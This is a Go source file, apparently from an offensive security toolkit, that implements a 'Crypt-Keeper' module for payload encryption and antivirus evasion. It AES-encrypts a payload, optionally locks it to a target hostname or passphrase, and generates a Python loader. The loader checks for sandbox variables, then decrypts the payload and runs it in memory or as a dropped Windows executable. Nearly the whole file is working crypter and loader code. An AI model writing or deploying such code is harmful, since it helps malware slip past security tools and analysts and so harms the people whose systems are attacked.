package cryptkeeper

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/bryanparreira/davoid/internal/modules/ui"
)

// RunFromFile encrypts a specific file without prompting for its path.
// Called by the payloads module after payload generation.
func RunFromFile(payloadPath string) error {
	ui.Header("Crypt-Keeper — Payload Encryption & AV Evasion")
	return runEncrypt(payloadPath)
}

func Run() error {
	ui.Header("Crypt-Keeper — Payload Encryption & AV Evasion")

	payloadPath := ui.Prompt("Path to payload file to encrypt")
	if payloadPath == "" {
		return nil
	}
	return runEncrypt(payloadPath)
}

func runEncrypt(payloadPath string) error {
	data, err := os.ReadFile(payloadPath)
	if err != nil {
		ui.Fail(fmt.Sprintf("Cannot read file: %v", err))
		return nil
	}

	mode := ui.Select("Encryption Mode", []string{
		"Global Key          (any machine can decrypt)",
		"Hostname-Locked     (only decrypts on target hostname)",
		"Passphrase-Locked   (key derived from passphrase)",
	})
	if mode < 0 {
		return nil
	}

	var key []byte
	var lockNote string

	switch mode {
	case 0:
		key = make([]byte, 32)
		rand.Read(key)
		lockNote = "global"
	case 1:
		hostname := ui.Prompt("Target hostname (exact)")
		if hostname == "" {
			return nil
		}
		h := sha256.Sum256([]byte(hostname))
		key = h[:]
		lockNote = "hostname=" + hostname
	case 2:
		pass := ui.Prompt("Encryption passphrase")
		if pass == "" {
			return nil
		}
		h := sha256.Sum256([]byte(pass))
		key = h[:]
		lockNote = "passphrase"
	}

	// Encrypt
	encrypted, err := aesGCMEncrypt(key, data)
	if err != nil {
		ui.Fail(fmt.Sprintf("Encryption failed: %v", err))
		return nil
	}

	b64Key := base64.StdEncoding.EncodeToString(key)
	b64Payload := base64.StdEncoding.EncodeToString(encrypted)

	// Save encrypted payload
	outPayload := fmt.Sprintf("payloads/enc_%d.bin", time.Now().Unix())
	os.MkdirAll("payloads", 0700)
	os.WriteFile(outPayload, encrypted, 0600)

	// Save key
	keyFile := strings.TrimSuffix(outPayload, ".bin") + ".key"
	os.WriteFile(keyFile, []byte(b64Key), 0600)

	// Generate self-decrypting stub
	stub := generateStub(b64Payload, b64Key, mode)
	stubFile := fmt.Sprintf("payloads/loader_%d.py", time.Now().Unix())
	os.WriteFile(stubFile, []byte(stub), 0700)

	fmt.Println()
	ui.Divider()
	ui.Success(fmt.Sprintf("Encrypted payload: %s", outPayload))
	ui.Success(fmt.Sprintf("Key file:          %s", keyFile))
	ui.Success(fmt.Sprintf("Self-decrypting loader: %s", stubFile))
	ui.Info(fmt.Sprintf("Lock mode: %s", lockNote))
	ui.Info(fmt.Sprintf("Original size: %d bytes → Encrypted: %d bytes", len(data), len(encrypted)))
	ui.Divider()

	ui.PressEnter()
	return nil
}

func aesGCMEncrypt(key, plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func generateStub(b64Payload, b64Key string, mode int) string {
	var lockCheck string
	switch mode {
	case 1:
		lockCheck = `
import socket
expected = "` + "HOSTNAME_PLACEHOLDER" + `"
if socket.gethostname() != expected:
    import sys; sys.exit(1)
`
	case 2:
		lockCheck = `
import hashlib, getpass
p = getpass.getpass("Key: ")
key = hashlib.sha256(p.encode()).digest()
`
	default:
		lockCheck = `
import base64
key = base64.b64decode("` + b64Key + `")
`
	}

	// Detect platform for exec method
	execMethod := `exec(compile(plain, '<loader>', 'exec'))`
	if runtime.GOOS == "windows" {
		execMethod = `
import ctypes, tempfile, os
tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.exe')
tmp.write(plain); tmp.close()
os.chmod(tmp.name, 0o755)
os.system(tmp.name)
`
	}

	return fmt.Sprintf(`#!/usr/bin/env python3
# Davoid Crypt-Keeper Self-Decrypting Loader
import base64, os, sys, time

# Anti-sandbox: sleep and check env
time.sleep(2)
if os.environ.get("SANDBOX") or os.environ.get("ANALYSIS"):
    sys.exit(0)
%s
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
ct = base64.b64decode("%s")
aesgcm = AESGCM(key)
nonce, ciphertext = ct[:12], ct[12:]
plain = aesgcm.decrypt(nonce, ciphertext, None)
%s
`, lockCheck, b64Payload, execMethod)
}
